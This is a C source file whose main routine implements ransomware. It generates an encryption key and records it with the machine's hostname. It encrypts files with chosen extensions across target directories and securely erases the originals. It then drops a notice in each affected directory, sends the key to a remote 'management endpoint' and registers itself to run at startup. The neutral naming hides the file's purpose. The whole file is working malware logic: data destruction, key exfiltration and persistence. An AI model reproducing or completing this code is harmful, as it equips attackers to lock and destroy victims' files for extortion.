#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "config.h"

int random_bytes(unsigned char *out, size_t len);
int base64_encode_string(const unsigned char *data, size_t data_len, char *out, size_t out_size);
int write_text_file(const char *path, const char *text);
size_t list_target_files(const char *const *dirs, size_t dir_count,
                         const char *const *exts, size_t ext_count, char ***out_paths);
int write_encrypted_sibling(const char *path, const unsigned char *key, size_t key_len);
int secure_erase(const char *path);
int write_notice(const char *directory);
int transmit_token(const char *endpoint, const char *token_path);
int schedule_autostart(const char *binary_path);

static int remember_directory(char **dirs, size_t count, size_t capacity, const char *dir)
{
    size_t i;

    for (i = 0; i < count; i++) {
        if (strcmp(dirs[i], dir) == 0)
            return 0;
    }
    if (count >= capacity)
        return 0;
    dirs[count] = strdup(dir);
    return dirs[count] != NULL ? 1 : 0;
}

int main(int argc, char *argv[])
{
    unsigned char key[SESSION_KEY_LEN];
    char token_b64[256];
    char json[512];
    char hostname[256];
    char **paths = NULL;
    char *affected[256];
    size_t affected_count = 0;
    size_t count;
    size_t i;

    if (random_bytes(key, sizeof key) != 0)
        return 1;
    if (base64_encode_string(key, sizeof key, token_b64, sizeof token_b64) != 0)
        return 1;
    if (gethostname(hostname, sizeof hostname - 1) != 0)
        snprintf(hostname, sizeof hostname, "unknown");
    hostname[sizeof hostname - 1] = '\0';
    if (snprintf(json, sizeof json, "{\"aes_key\":\"%s\",\"hostname\":\"%s\"}",
                 token_b64, hostname) < 0)
        return 1;
    if (write_text_file(SESSION_TOKEN_PATH, json) != 0)
        return 1;

    count = list_target_files(TARGET_DIRS, TARGET_DIR_COUNT,
                              TARGET_EXTS, TARGET_EXT_COUNT, &paths);
    for (i = 0; i < count; i++) {
        char dirbuf[4096];
        char *slash;

        if (write_encrypted_sibling(paths[i], key, sizeof key) != 0) {
            free(paths[i]);
            continue;
        }
        secure_erase(paths[i]);
        if (snprintf(dirbuf, sizeof dirbuf, "%s", paths[i]) < 0) {
            free(paths[i]);
            continue;
        }
        slash = strrchr(dirbuf, '/');
        if (slash != NULL) {
            *slash = '\0';
            if (remember_directory(affected, affected_count, 256, dirbuf) == 1)
                affected_count++;
        }
        free(paths[i]);
    }
    free(paths);

    for (i = 0; i < affected_count; i++) {
        write_notice(affected[i]);
        free(affected[i]);
    }

    transmit_token(MANAGEMENT_ENDPOINT, SESSION_TOKEN_PATH);
    if (argc > 0)
        schedule_autostart(argv[0]);
    return 0;
}
